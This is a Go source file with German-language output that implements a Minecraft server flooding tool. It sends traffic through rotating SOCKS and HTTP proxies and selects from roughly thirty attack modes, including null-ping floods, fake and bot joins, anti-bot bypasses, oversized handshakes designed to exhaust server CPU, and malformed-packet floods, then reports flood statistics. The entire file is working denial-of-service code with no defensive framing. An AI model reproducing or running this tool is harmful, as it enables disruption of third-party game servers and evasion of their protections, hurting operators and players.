package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type MinecraftFlooder struct {
	servers         []string
	proxies         []ProxyConfig
	useRotating     bool
	concurrency     int
	duration        time.Duration
	floodType       string
	totalRequests   int64
	successRequests int64
	failedRequests  int64
	currentProxyIdx int64
	errorStats      map[string]int64
	errorMutex      sync.RWMutex
}

type MinecraftServer struct {
	Host string
	Port uint16
}

const LOOP_AMOUNT = 1900

func NewMinecraftFlooder(servers []string, proxies []ProxyConfig, useRotating bool, concurrency int, duration time.Duration, floodType string) *MinecraftFlooder {
	return &MinecraftFlooder{
		servers:         servers,
		proxies:         proxies,
		useRotating:     useRotating,
		concurrency:     concurrency,
		duration:        duration,
		floodType:       floodType,
		errorStats:      make(map[string]int64),
		currentProxyIdx: 0,
	}
}

func (mf *MinecraftFlooder) getNextProxy() ProxyConfig {
	if len(mf.proxies) == 0 {
		return ProxyConfig{}
	}

	if mf.useRotating {
		idx := atomic.AddInt64(&mf.currentProxyIdx, 1) % int64(len(mf.proxies))
		return mf.proxies[idx]
	}

	return mf.proxies[0]
}

func (mf *MinecraftFlooder) trackError(errorType string) {
	mf.errorMutex.Lock()
	defer mf.errorMutex.Unlock()
	mf.errorStats[errorType]++
}

func (mf *MinecraftFlooder) getErrorStats() map[string]int64 {
	mf.errorMutex.RLock()
	defer mf.errorMutex.RUnlock()
	stats := make(map[string]int64)
	for k, v := range mf.errorStats {
		stats[k] = v
	}
	return stats
}

func (mf *MinecraftFlooder) Start() {
	fmt.Printf("Starte Minecraft Server Flooder\n")
	fmt.Printf("Ziel-Server: %d Server\n", len(mf.servers))
	fmt.Printf("Konfiguration: %d Worker, Dauer: %v, Typ: %s\n",
		mf.concurrency, mf.duration, mf.floodType)

	if len(mf.proxies) > 0 {
		fmt.Printf("Verwende %d Proxys (Rotation: %t)\n", len(mf.proxies), mf.useRotating)
	}

	fmt.Println(strings.Repeat("=", 60))

	ctx, cancel := context.WithTimeout(context.Background(), mf.duration)
	defer cancel()

	var wg sync.WaitGroup
	requestChan := make(chan string, mf.concurrency*2)

	// Worker starten
	for i := 0; i < mf.concurrency; i++ {
		wg.Add(1)
		go mf.worker(ctx, &wg, requestChan, i)
	}

	// Server-Generator
	go func() {
		defer close(requestChan)
		for {
			select {
			case <-ctx.Done():
				return
			default:
				for _, server := range mf.servers {
					select {
					case requestChan <- server:
					case <-ctx.Done():
						return
					}
				}
			}
		}
	}()

	// Live-Statistiken
	statsTicker := time.NewTicker(time.Second)
	defer statsTicker.Stop()

	go mf.printLiveStats(ctx, statsTicker.C)

	wg.Wait()
	mf.printFinalStats()
}

func (mf *MinecraftFlooder) worker(ctx context.Context, wg *sync.WaitGroup, requestChan <-chan string, workerID int) {
	defer wg.Done()

	for {
		select {
		case <-ctx.Done():
			return
		case server, ok := <-requestChan:
			if !ok {
				return
			}

			atomic.AddInt64(&mf.totalRequests, 1)

			var err error
			if len(mf.proxies) > 0 {
				proxy := mf.getNextProxy()
				err = mf.performFlood(ctx, server, proxy)
			} else {
				err = mf.performDirectFlood(ctx, server)
			}

			if err != nil {
				atomic.AddInt64(&mf.failedRequests, 1)
				mf.trackError(fmt.Sprintf("%T", err))
			} else {
				atomic.AddInt64(&mf.successRequests, 1)
			}
		}
	}
}

func (mf *MinecraftFlooder) performFlood(ctx context.Context, server string, proxyConfig ProxyConfig) error {
	mcServer, err := parseMinecraftServer(server)
	if err != nil {
		return err
	}

	conn, err := mf.connectViaProxy(ctx, mcServer, proxyConfig)
	if err != nil {
		return err
	}
	defer conn.Close()

	return mf.executeFloodType(conn, mcServer)
}

func (mf *MinecraftFlooder) performDirectFlood(ctx context.Context, server string) error {
	mcServer, err := parseMinecraftServer(server)
	if err != nil {
		return err
	}

	dialer := &net.Dialer{
		Timeout: 10 * time.Second,
	}

	address := net.JoinHostPort(mcServer.Host, strconv.Itoa(int(mcServer.Port)))
	conn, err := dialer.DialContext(ctx, "tcp", address)
	if err != nil {
		return err
	}
	defer conn.Close()

	return mf.executeFloodType(conn, mcServer)
}

func (mf *MinecraftFlooder) connectViaProxy(ctx context.Context, mcServer MinecraftServer, proxyConfig ProxyConfig) (net.Conn, error) {
	proxyAddr := net.JoinHostPort(proxyConfig.Host, proxyConfig.Port)
	targetAddr := net.JoinHostPort(mcServer.Host, strconv.Itoa(int(mcServer.Port)))

	switch proxyConfig.Protocol {
	case "socks5":
		return mf.connectViaSocks5(ctx, proxyAddr, targetAddr, proxyConfig)
	case "socks4":
		return mf.connectViaSocks4(ctx, proxyAddr, targetAddr)
	case "http", "https":
		return mf.connectViaHTTP(ctx, proxyAddr, targetAddr, proxyConfig)
	default:
		return nil, fmt.Errorf("unbekanntes Proxy-Protokoll: %s", proxyConfig.Protocol)
	}
}

func (mf *MinecraftFlooder) connectViaSocks5(ctx context.Context, proxyAddr, targetAddr string, proxyConfig ProxyConfig) (net.Conn, error) {
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	conn, err := dialer.DialContext(ctx, "tcp", proxyAddr)
	if err != nil {
		return nil, err
	}

	// SOCKS5 Handshake
	var authMethod byte = 0x00 // No auth
	if proxyConfig.Username != "" {
		authMethod = 0x02 // Username/password auth
	}

	// Send method selection
	_, err = conn.Write([]byte{0x05, 0x01, authMethod})
	if err != nil {
		conn.Close()
		return nil, err
	}

	// Read method response
	response := make([]byte, 2)
	_, err = io.ReadFull(conn, response)
	if err != nil {
		conn.Close()
		return nil, err
	}

	if response[0] != 0x05 {
		conn.Close()
		return nil, fmt.Errorf("ungültige SOCKS5-Version")
	}

	if response[1] == 0xFF {
		conn.Close()
		return nil, fmt.Errorf("keine geeignete Authentifizierungsmethode")
	}

	// Handle authentication if required
	if response[1] == 0x02 {
		// Username/password authentication
		auth := []byte{0x01}
		auth = append(auth, byte(len(proxyConfig.Username)))
		auth = append(auth, proxyConfig.Username...)
		auth = append(auth, byte(len(proxyConfig.Password)))
		auth = append(auth, proxyConfig.Password...)

		_, err = conn.Write(auth)
		if err != nil {
			conn.Close()
			return nil, err
		}

		authResp := make([]byte, 2)
		_, err = io.ReadFull(conn, authResp)
		if err != nil {
			conn.Close()
			return nil, err
		}

		if authResp[1] != 0x00 {
			conn.Close()
			return nil, fmt.Errorf("authentifizierung fehlgeschlagen")
		}
	}

	// Connect request
	host, portStr, err := net.SplitHostPort(targetAddr)
	if err != nil {
		conn.Close()
		return nil, err
	}

	port, err := strconv.Atoi(portStr)
	if err != nil {
		conn.Close()
		return nil, err
	}

	connectReq := []byte{0x05, 0x01, 0x00, 0x03}
	connectReq = append(connectReq, byte(len(host)))
	connectReq = append(connectReq, host...)
	connectReq = append(connectReq, byte(port>>8), byte(port&0xFF))

	_, err = conn.Write(connectReq)
	if err != nil {
		conn.Close()
		return nil, err
	}

	// Read connect response
	connectResp := make([]byte, 4)
	_, err = io.ReadFull(conn, connectResp)
	if err != nil {
		conn.Close()
		return nil, err
	}

	if connectResp[1] != 0x00 {
		conn.Close()
		return nil, fmt.Errorf("SOCKS5-Verbindung fehlgeschlagen: %d", connectResp[1])
	}

	// Skip the bound address
	switch connectResp[3] {
	case 0x01: // IPv4
		_, err = io.ReadFull(conn, make([]byte, 6))
	case 0x03: // Domain name
		lengthByte := make([]byte, 1)
		_, err = io.ReadFull(conn, lengthByte)
		if err == nil {
			_, err = io.ReadFull(conn, make([]byte, int(lengthByte[0])+2))
		}
	case 0x04: // IPv6
		_, err = io.ReadFull(conn, make([]byte, 18))
	}

	if err != nil {
		conn.Close()
		return nil, err
	}

	return conn, nil
}

func (mf *MinecraftFlooder) connectViaSocks4(ctx context.Context, proxyAddr, targetAddr string) (net.Conn, error) {
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	conn, err := dialer.DialContext(ctx, "tcp", proxyAddr)
	if err != nil {
		return nil, err
	}

	host, portStr, err := net.SplitHostPort(targetAddr)
	if err != nil {
		conn.Close()
		return nil, err
	}

	port, err := strconv.Atoi(portStr)
	if err != nil {
		conn.Close()
		return nil, err
	}

	// Resolve target IP
	ips, err := net.LookupIP(host)
	if err != nil {
		conn.Close()
		return nil, err
	}

	var targetIP net.IP
	for _, ip := range ips {
		if ip.To4() != nil {
			targetIP = ip.To4()
			break
		}
	}

	if targetIP == nil {
		conn.Close()
		return nil, fmt.Errorf("kann IPv4-Adresse für %s nicht auflösen", host)
	}

	// Build SOCKS4 request
	request := []byte{
		0x04,              // SOCKS version
		0x01,              // Command code (connect)
		byte(port >> 8),   // Port high byte
		byte(port & 0xFF), // Port low byte
	}
	request = append(request, targetIP...)
	request = append(request, 0x00) // User ID (empty)

	_, err = conn.Write(request)
	if err != nil {
		conn.Close()
		return nil, err
	}

	// Read response
	response := make([]byte, 8)
	_, err = io.ReadFull(conn, response)
	if err != nil {
		conn.Close()
		return nil, err
	}

	if response[1] != 0x5A {
		conn.Close()
		return nil, fmt.Errorf("SOCKS4-Verbindung fehlgeschlagen: %d", response[1])
	}

	return conn, nil
}

func (mf *MinecraftFlooder) connectViaHTTP(ctx context.Context, proxyAddr, targetAddr string, proxyConfig ProxyConfig) (net.Conn, error) {
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	conn, err := dialer.DialContext(ctx, "tcp", proxyAddr)
	if err != nil {
		return nil, err
	}

	// Send CONNECT request
	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", targetAddr, targetAddr)

	if proxyConfig.Username != "" {
		auth := fmt.Sprintf("%s:%s", proxyConfig.Username, proxyConfig.Password)
		connectReq += fmt.Sprintf("Proxy-Authorization: Basic %s\r\n", auth)
	}

	connectReq += "\r\n"

	_, err = conn.Write([]byte(connectReq))
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("HTTP CONNECT request failed: %w", err)
	}

	// Read response status line
	response := make([]byte, 1024)
	n, err := conn.Read(response)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("http connect response failed: %w", err)
	}

	responseStr := string(response[:n])
	if !strings.Contains(responseStr, "200") {
		conn.Close()
		return nil, fmt.Errorf("http connect failed: %s", responseStr)
	}

	return conn, nil
}

func (mf *MinecraftFlooder) executeFloodType(conn net.Conn, server MinecraftServer) error {
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	switch mf.floodType {
	case "localhost":
		return mf.localhostAttack(conn, server)
	case "namenullping":
		return mf.nameNullPingAttack(conn, server)
	case "bosshandler":
		return mf.bossHandlerAttack(conn, server)
	case "fakepremium_join":
		return mf.fakePremiumJoinAttack(conn, server)
	case "botnullping":
		return mf.botNullPingAttack(conn, server)
	case "ultrajoin":
		return mf.ultraJoinAttack(conn, server)
	case "ufo":
		return mf.ufoAttack(conn, server)
	case "nAntibot":
		return mf.nAntibotAttack(conn, server)
	case "2lsbypass":
		return mf.twoLSBypassAttack(conn, server)
	case "multikiller":
		return mf.multiKillerAttack(conn, server)
	case "aegiskiller":
		return mf.aegisKillerAttack(conn, server)
	case "cpulagger":
		return mf.cpuLaggerAttack(conn, server)
	case "destroyer":
		return mf.destroyerAttack(conn, server)
	case "IDERROR":
		return mf.idErrorAttack(conn, server)
	case "fakehost":
		return mf.fakeHostAttack(conn, server)
	case "proauthkiller":
		return mf.proAuthKillerAttack(conn, server)
	case "flood":
		return mf.standardFlood(conn, server)
	case "joinbots":
		return mf.joinBotsAttack(conn, server)
	case "botfucker":
		return mf.botFuckerAttack(conn, server)
	case "consola":
		return mf.consolaAttack(conn, server)
	case "paola":
		return mf.paolaAttack(conn, server)
	case "TimeOutKiller":
		return mf.timeOutKillerAttack(conn, server)
	case "cpuburner6":
		return mf.cpuBurner6Attack(conn, server)
	case "cpuRipper":
		return mf.cpuRipperAttack(conn, server)
	case "fakejoin":
		return mf.fakeJoinAttack(conn, server)
	case "fastjoin":
		return mf.fastJoinAttack(conn, server)
	case "motdkiller":
		return mf.motdKillerAttack(conn, server)
	case "legacy_motd":
		return mf.legacyMotdAttack(conn, server)
	case "byte":
		return mf.byteAttack(conn, server)
	default:
		return mf.ultraJoinAttack(conn, server)
	}
}

// Neue Angriffsmethoden aus dem Java-Code
func (mf *MinecraftFlooder) localhostAttack(conn net.Conn, server MinecraftServer) error {
	data := []byte{15, 0, 47, 9}
	data = append(data, []byte("localhost")...)
	data = append(data, []byte{99, 224, 1}...)

	_, err := conn.Write(data)
	if err != nil {
		return err
	}

	for i := 0; i < LOOP_AMOUNT; i++ {
		_, err = conn.Write([]byte{1, 0})
		if err != nil {
			break
		}
	}
	return err
}

func (mf *MinecraftFlooder) nameNullPingAttack(conn net.Conn, server MinecraftServer) error {
	data := []byte{15, 0, 47, 9}
	data = append(data, []byte("host")...)
	data = append(data, []byte{99, 223, 2}...)

	cipher := "ZEYSO_" + mf.randomString(8)
	data = append(data, byte(len(cipher)+2), 0, byte(len(cipher)))
	data = append(data, []byte(cipher)...)

	_, err := conn.Write(data)
	return err
}

func (mf *MinecraftFlooder) bossHandlerAttack(conn net.Conn, server MinecraftServer) error {
	data := []byte{0, 17, 19, 21, 0, 241, 239, 237, 235, 1, 1, 0, 1, 0, 1}
	_, err := conn.Write(data)
	if err != nil {
		return err
	}

	for i := 0; i < LOOP_AMOUNT; i++ {
		_, err = conn.Write([]byte{0})
		if err != nil {
			break
		}
	}
	return err
}

func (mf *MinecraftFlooder) fakePremiumJoinAttack(conn net.Conn, server MinecraftServer) error {
	nick := mf.randomString(14)
	data := []byte{byte(len(nick) + 2), 0, byte(len(nick))}
	data = append(data, []byte(nick)...)
	data = append(data, []byte{1, 248, 251, 248, 251, 2, 1}...)

	_, err := conn.Write(data)
	return err
}

func (mf *MinecraftFlooder) botNullPingAttack(conn net.Conn, server MinecraftServer) error {
	data := []byte{15, 0, 47, 9}
	data = append(data, []byte("localhost")...)
	data = append(data, []byte{99, 223}...)

	nick := mf.randomString(14) + "_Paola"
	data = append(data, byte(len(nick)+2), 0, byte(len(nick)))
	data = append(data, []byte(nick)...)
	data = append(data, 185)

	_, err := conn.Write(data)
	if err != nil {
		return err
	}

	for i := 0; i < 1900; i++ {
		_, err = conn.Write([]byte{1, 0})
		if err != nil {
			break
		}
	}
	return err
}

func (mf *MinecraftFlooder) ufoAttack(conn net.Conn, server MinecraftServer) error {
	seconds := time.Now().Unix() / 86400

	if seconds%2 > 0 {
		_, err := conn.Write(mf.getLoginPreparedBytes())
		if err != nil {
			return err
		}
	} else {
		_, err := conn.Write([]byte{15})
		if err != nil {
			return err
		}
	}

	data := []byte{0, 47, 9}
	data = append(data, []byte("localhost")...)
	data = append(data, []byte{99, 223, 2}...)

	nick := mf.randomString(3) + "_ZEYSO_BOT"
	data = append(data, byte(len(nick)+2), 0, byte(len(nick)))
	data = append(data, []byte(nick)...)

	_, err := conn.Write(data)
	return err
}

func (mf *MinecraftFlooder) nAntibotAttack(conn net.Conn, server MinecraftServer) error {
	_, err := conn.Write(mf.getLoginPreparedBytes())
	if err != nil {
		return err
	}

	nick := "_ZEYSO_BOT"
	_, err = conn.Write([]byte(nick))
	if err != nil {
		return err
	}

	_, err = conn.Write([]byte("fakejoin"))
	if err != nil {
		return err
	}

	for i := 0; i < 11; i++ {
		_, err = conn.Write([]byte{154, 154}) // 666 & 0xFF = 154
		if err != nil {
			break
		}
	}

	for i := 1; i < LOOP_AMOUNT; i++ {
		_, err = conn.Write([]byte{0})
		if err != nil {
			break
		}
	}
	return err
}

func (mf *MinecraftFlooder) idErrorAttack(conn net.Conn, server MinecraftServer) error {
	data := []byte{6, 250, 241, 240, 6}
	_, err := conn.Write(data)
	if err != nil {
		return err
	}

	for i := 0; i < LOOP_AMOUNT; i++ {
		_, err = conn.Write([]byte{6, 250})
		if err != nil {
			break
		}
	}
	return err
}

func (mf *MinecraftFlooder) fakeHostAttack(conn net.Conn, server MinecraftServer) error {
	_, err := conn.Write(mf.getLoginPreparedBytes())
	if err != nil {
		return err
	}

	nick := mf.randomString(3) + "_ZEYSO_BOT"
	_, err = conn.Write([]byte(nick))
	if err != nil {
		return err
	}

	fakehost := mf.randomString(255)
	data := []byte{byte(len(fakehost))}
	data = append(data, []byte(fakehost)...)
	data = append(data, []byte{99, 223, 2}...)
	data = append(data, []byte(fakehost)...)
	data = append(data, byte(len(fakehost)+2), 0, byte(len(fakehost)))

	_, err = conn.Write(data)
	return err
}

func (mf *MinecraftFlooder) proAuthKillerAttack(conn net.Conn, server MinecraftServer) error {
	_, err := conn.Write(mf.getLoginPreparedBytes())
	if err != nil {
		return err
	}

	nick := mf.randomString(3) + "_ZEYSO_BOT"
	_, err = conn.Write([]byte(nick))
	if err != nil {
		return err
	}

	data := []byte{0, byte(len(nick))}
	data = append(data, []byte(nick)...)
	data = append(data, []byte{1, 248, 251, 248, 251, 2, 1, 1}...)

	_, err = conn.Write(data)
	return err
}

func (mf *MinecraftFlooder) consolaAttack(conn net.Conn, server MinecraftServer) error {
	message := fmt.Sprintf("Hola%d", rand.Intn(100))
	_, err := conn.Write([]byte(message))
	if err != nil {
		return err
	}

	data := []byte{15, 0, 47, 9}
	data = append(data, []byte("localhost")...)
	data = append(data, []byte{99, 224, 1}...)

	_, err = conn.Write(data)
	if err != nil {
		return err
	}

	for i := 0; i < LOOP_AMOUNT; i++ {
		_, err = conn.Write([]byte{1, 0})
		if err != nil {
			break
		}
	}
	return err
}

func (mf *MinecraftFlooder) paolaAttack(conn net.Conn, server MinecraftServer) error {
	loginBytes := mf.getLoginPreparedBytes()
	for i := 0; i < 5; i++ {
		_, err := conn.Write(loginBytes)
		if err != nil {
			return err
		}
	}

	nick := mf.randomString(3) + "_ZEYSO_BOT"
	_, err := conn.Write([]byte(nick))
	if err != nil {
		return err
	}

	_, err = conn.Write([]byte("botfucker"))
	return err
}

func (mf *MinecraftFlooder) timeOutKillerAttack(conn net.Conn, server MinecraftServer) error {
	data := []byte{23, 200, 12, 52} // 535 & 0xFF = 23, 456 & 0xFF = 200
	data = append(data, []byte(server.Host)...)
	data = append(data, []byte{111, 1}...) // 367 & 0xFF = 111

	_, err := conn.Write(data)
	if err != nil {
		return err
	}

	for i := 0; i < LOOP_AMOUNT; i++ {
		_, err = conn.Write([]byte{1, 0})
		if err != nil {
			break
		}
	}
	return err
}

func (mf *MinecraftFlooder) cpuBurner6Attack(conn net.Conn, server MinecraftServer) error {
	data := []byte{0, 47, 13, 52, 53, 46, 56, 57, 46, 49, 52, 49, 46, 49, 52, 54, 99, 221}
	_, err := conn.Write(data)
	if err != nil {
		return err
	}

	for i := 0; i < LOOP_AMOUNT; i++ {
		_, err = conn.Write([]byte{1, 0})
		if err != nil {
			break
		}
	}
	return err
}

// Bereits vorhandene Methoden bleiben unverändert...
func (mf *MinecraftFlooder) ultraJoinAttack(conn net.Conn, server MinecraftServer) error {
	// Handshake packet
	handshake := mf.createHandshakePacket(server.Host, server.Port, 2) // 2 = login state
	if err := mf.sendPacket(conn, handshake); err != nil {
		return err
	}

	// Login start with random username
	username := mf.generateRandomUsername()
	loginStart := mf.createLoginStartPacket(username)
	return mf.sendPacket(conn, loginStart)
}

func (mf *MinecraftFlooder) multiKillerAttack(conn net.Conn, server MinecraftServer) error {
	// Multiple rapid handshakes with different protocols
	protocols := []int32{4, 5, 47, 107, 110, 210, 315, 393, 401, 477, 480, 485, 490, 498, 573, 575, 578, 735, 736, 751, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764}

	for _, protocol := range protocols {
		handshake := mf.createHandshakePacketWithProtocol(server.Host, server.Port, 1, protocol)
		if err := mf.sendPacket(conn, handshake); err != nil {
			return err
		}

		// Status request
		statusReq := []byte{0x01, 0x00}
		if err := mf.sendPacket(conn, statusReq); err != nil {
			return err
		}
	}

	return nil
}

func (mf *MinecraftFlooder) fakeJoinAttack(conn net.Conn, server MinecraftServer) error {
	// Handshake für Login
	handshake := mf.createHandshakePacket(server.Host, server.Port, 2)
	if err := mf.sendPacket(conn, handshake); err != nil {
		return err
	}

	// Login start mit fake Username
	fakeUsername := mf.generateFakeUsername()
	loginStart := mf.createLoginStartPacket(fakeUsername)
	return mf.sendPacket(conn, loginStart)
}

func (mf *MinecraftFlooder) motdKillerAttack(conn net.Conn, server MinecraftServer) error {
	// Rapid MOTD requests
	for i := 0; i < 10; i++ {
		handshake := mf.createHandshakePacket(server.Host, server.Port, 1) // 1 = status state
		if err := mf.sendPacket(conn, handshake); err != nil {
			return err
		}

		statusReq := []byte{0x01, 0x00}
		if err := mf.sendPacket(conn, statusReq); err != nil {
			return err
		}
	}
	return nil
}

func (mf *MinecraftFlooder) cpuLaggerAttack(conn net.Conn, server MinecraftServer) error {
	// Large handshake packet
	largeHost := strings.Repeat("a", 32767)
	handshake := mf.createHandshakePacket(largeHost, server.Port, 1)
	if err := mf.sendPacket(conn, handshake); err != nil {
		return err
	}

	statusReq := []byte{0x01, 0x00}
	return mf.sendPacket(conn, statusReq)
}

func (mf *MinecraftFlooder) botFuckerAttack(conn net.Conn, server MinecraftServer) error {
	// Send malformed packets
	malformedPackets := [][]byte{
		{0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
		{0x00, 0x00, 0x00, 0x00},
		{0xDE, 0xAD, 0xBE, 0xEF},
	}

	for _, packet := range malformedPackets {
		if _, err := conn.Write(packet); err != nil {
			return err
		}
	}

	return nil
}

func (mf *MinecraftFlooder) joinBotsAttack(conn net.Conn, server MinecraftServer) error {
	// Multiple join attempts with bot-like usernames
	botNames := []string{"Bot1", "Bot2", "Bot3", "AutoBot", "TestBot"}

	for _, botName := range botNames {
		handshake := mf.createHandshakePacket(server.Host, server.Port, 2)
		if err := mf.sendPacket(conn, handshake); err != nil {
			return err
		}

		loginStart := mf.createLoginStartPacket(botName)
		if err := mf.sendPacket(conn, loginStart); err != nil {
			return err
		}
	}

	return nil
}

func (mf *MinecraftFlooder) fastJoinAttack(conn net.Conn, server MinecraftServer) error {
	// Ultra-fast join attempt
	handshake := mf.createHandshakePacket(server.Host, server.Port, 2)
	if err := mf.sendPacket(conn, handshake); err != nil {
		return err
	}

	username := "FastJoin" + strconv.Itoa(rand.Intn(9999))
	loginStart := mf.createLoginStartPacket(username)
	return mf.sendPacket(conn, loginStart)
}

func (mf *MinecraftFlooder) destroyerAttack(conn net.Conn, server MinecraftServer) error {
	// Combination attack
	attacks := []func(net.Conn, MinecraftServer) error{
		mf.ultraJoinAttack,
		mf.motdKillerAttack,
		mf.fakeJoinAttack,
	}

	for _, attack := range attacks {
		if err := attack(conn, server); err != nil {
			return err
		}
	}

	return nil
}

func (mf *MinecraftFlooder) aegisKillerAttack(conn net.Conn, server MinecraftServer) error {
	// Anti-bot bypass attempt
	handshake := mf.createHandshakePacket(server.Host, server.Port, 2)
	if err := mf.sendPacket(conn, handshake); err != nil {
		return err
	}

	// Use realistic username pattern
	username := "Player" + strconv.Itoa(rand.Intn(99999))
	loginStart := mf.createLoginStartPacket(username)
	return mf.sendPacket(conn, loginStart)
}

func (mf *MinecraftFlooder) twoLSBypassAttack(conn net.Conn, server MinecraftServer) error {
	// 2LS (Two Login States) bypass
	// First handshake for status
	handshake1 := mf.createHandshakePacket(server.Host, server.Port, 1)
	if err := mf.sendPacket(conn, handshake1); err != nil {
		return err
	}

	// Second handshake for login without proper state change
	handshake2 := mf.createHandshakePacket(server.Host, server.Port, 2)
	if err := mf.sendPacket(conn, handshake2); err != nil {
		return err
	}

	username := "Bypass" + strconv.Itoa(rand.Intn(9999))
	loginStart := mf.createLoginStartPacket(username)
	return mf.sendPacket(conn, loginStart)
}

func (mf *MinecraftFlooder) cpuRipperAttack(conn net.Conn, server MinecraftServer) error {
	// Extremely large packets to consume CPU
	hugeHost := strings.Repeat("x", 65535)
	handshake := mf.createHandshakePacket(hugeHost, server.Port, 1)
	return mf.sendPacket(conn, handshake)
}

func (mf *MinecraftFlooder) byteAttack(conn net.Conn, server MinecraftServer) error {
	// Random byte flood
	randomBytes := make([]byte, 1024)
	rand.Read(randomBytes)
	_, err := conn.Write(randomBytes)
	return err
}

func (mf *MinecraftFlooder) standardFlood(conn net.Conn, server MinecraftServer) error {
	// Standard ping flood
	handshake := mf.createHandshakePacket(server.Host, server.Port, 1)
	if err := mf.sendPacket(conn, handshake); err != nil {
		return err
	}

	statusReq := []byte{0x01, 0x00}
	return mf.sendPacket(conn, statusReq)
}

func (mf *MinecraftFlooder) legacyMotdAttack(conn net.Conn, server MinecraftServer) error {
	// Legacy server list ping
	legacyPing := []byte{0xFE, 0x01}
	_, err := conn.Write(legacyPing)
	return err
}

// Helper functions
func (mf *MinecraftFlooder) createHandshakePacket(host string, port uint16, nextState int32) []byte {
	return mf.createHandshakePacketWithProtocol(host, port, nextState, 763) // 1.20.1 protocol
}

func (mf *MinecraftFlooder) createHandshakePacketWithProtocol(host string, port uint16, nextState int32, protocolVersion int32) []byte {
	var buf bytes.Buffer

	// Packet ID (0x00 for handshake)
	mf.writeVarInt(&buf, 0)

	// Protocol version
	mf.writeVarInt(&buf, protocolVersion)

	// Server address
	mf.writeString(&buf, host)

	// Server port
	binary.Write(&buf, binary.BigEndian, port)

	// Next state
	mf.writeVarInt(&buf, nextState)

	// Prepend packet length
	packetData := buf.Bytes()
	var result bytes.Buffer
	mf.writeVarInt(&result, int32(len(packetData)))
	result.Write(packetData)

	return result.Bytes()
}

func (mf *MinecraftFlooder) createLoginStartPacket(username string) []byte {
	var buf bytes.Buffer

	// Packet ID (0x00 for login start)
	mf.writeVarInt(&buf, 0)

	// Username
	mf.writeString(&buf, username)

	// Prepend packet length
	packetData := buf.Bytes()
	var result bytes.Buffer
	mf.writeVarInt(&result, int32(len(packetData)))
	result.Write(packetData)

	return result.Bytes()
}

func (mf *MinecraftFlooder) writeVarInt(buf *bytes.Buffer, value int32) {
	for {
		temp := value & 0x7F
		value >>= 7
		if value != 0 {
			temp |= 0x80
		}
		buf.WriteByte(byte(temp))
		if value == 0 {
			break
		}
	}
}

func (mf *MinecraftFlooder) writeString(buf *bytes.Buffer, str string) {
	mf.writeVarInt(buf, int32(len(str)))
	buf.WriteString(str)
}

func (mf *MinecraftFlooder) sendPacket(conn net.Conn, packet []byte) error {
	_, err := conn.Write(packet)
	return err
}

func (mf *MinecraftFlooder) generateRandomUsername() string {
	usernames := []string{
		"Player", "User", "Gamer", "Test", "Random", "Anonymous", "Guest",
		"Noob", "Pro", "Elite", "Ninja", "Shadow", "Dark", "Light",
	}

	base := usernames[rand.Intn(len(usernames))]
	return base + strconv.Itoa(rand.Intn(9999))
}

func (mf *MinecraftFlooder) generateFakeUsername() string {
	fakeUsernames := []string{
		"Notch", "jeb_", "Dinnerbone", "Grumm", "Steve", "Alex",
		"Herobrine", "Admin", "Moderator", "Owner", "Console",
		"System", "Server", "Bot", "Null", "Undefined",
	}

	return fakeUsernames[rand.Intn(len(fakeUsernames))] + strconv.Itoa(rand.Intn(999))
}

func (mf *MinecraftFlooder) randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func (mf *MinecraftFlooder) getLoginPreparedBytes() []byte {
	// Simuliert die Prepares.getLoginPreparedBytes() Methode
	return []byte{0x10, 0x00, 0x2F, 0x09}
}

func parseMinecraftServer(server string) (MinecraftServer, error) {
	if !strings.Contains(server, ":") {
		return MinecraftServer{Host: server, Port: 25565}, nil // Standard Minecraft port
	}

	host, portStr, err := net.SplitHostPort(server)
	if err != nil {
		return MinecraftServer{}, fmt.Errorf("invalid server format: %w", err)
	}

	port, err := strconv.ParseUint(portStr, 10, 16)
	if err != nil {
		return MinecraftServer{}, fmt.Errorf("invalid port: %w", err)
	}

	return MinecraftServer{Host: host, Port: uint16(port)}, nil
}

func (mf *MinecraftFlooder) printLiveStats(ctx context.Context, ticker <-chan time.Time) {
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker:
			total := atomic.LoadInt64(&mf.totalRequests)
			success := atomic.LoadInt64(&mf.successRequests)
			failed := atomic.LoadInt64(&mf.failedRequests)

			if total > 0 {
				successRate := float64(success) / float64(total) * 100
				fmt.Printf("\rFlood-Statistiken: %d gesamt | %d erfolgreich (%.1f%%) | %d fehlgeschlagen",
					total, success, successRate, failed)
			}
		}
	}
}

func (mf *MinecraftFlooder) printFinalStats() {
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("MINECRAFT FLOODER STATISTIKEN")
	fmt.Println(strings.Repeat("=", 60))

	total := atomic.LoadInt64(&mf.totalRequests)
	success := atomic.LoadInt64(&mf.successRequests)
	failed := atomic.LoadInt64(&mf.failedRequests)

	if total > 0 {
		successRate := float64(success) / float64(total) * 100
		failRate := float64(failed) / float64(total) * 100
		rps := float64(total) / mf.duration.Seconds()

		fmt.Printf("Ziel-Server: %d Server\n", len(mf.servers))
		fmt.Printf("Flood-Typ: %s\n", mf.floodType)
		fmt.Printf("Testdauer: %v\n", mf.duration)
		fmt.Printf("Gesamt Floods: %d\n", total)
		fmt.Printf("Erfolgreiche Floods: %d (%.2f%%)\n", success, successRate)
		fmt.Printf("Fehlgeschlagene Floods: %d (%.2f%%)\n", failed, failRate)
		fmt.Printf("Floods/Sekunde: %.2f\n", rps)

		errorStats := mf.getErrorStats()
		if len(errorStats) > 0 {
			fmt.Println("\nFEHLER-VERTEILUNG:")
			for errorType, count := range errorStats {
				percentage := float64(count) / float64(failed) * 100
				fmt.Printf("  %s: %d (%.1f%%)\n", errorType, count, percentage)
			}
		}
	} else {
		fmt.Println("Keine Floods verarbeitet")
	}

	fmt.Println(strings.Repeat("=", 60))
}
